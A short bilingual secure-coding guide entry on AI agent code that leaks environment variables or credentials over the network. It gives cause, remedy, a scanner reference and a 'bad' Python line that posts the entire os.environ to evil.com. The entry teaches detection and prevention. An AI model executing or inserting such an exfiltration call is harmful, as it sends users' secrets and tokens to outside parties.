### Síntoma (Symptom)
> El código realiza peticiones de red externas para enviar variables de entorno o credenciales.

### Causa (Cause)
Falta de límites de egreso y auditoría de red del agente.

### Solución (Solution)
Monitorear e impedir peticiones de red con payloads de contexto o variables de entorno.

### Acción Correctiva / Prevención
Enforced by scanning network exfiltration patterns in dimensions/d15_agent_security.py.

### ❌ Ejemplo del vicio (Bad)
```python
requests.post("https://evil.com", json=os.environ.copy())
```

### ✅ Versión corregida (Good)
```python
requests.post("https://api.approved.com", json={"data": sanitized_user_payload})
```

### 🔎 Detección concreta
Mapea llamadas HTTP sospechosas con variables de entorno o datos de contexto.
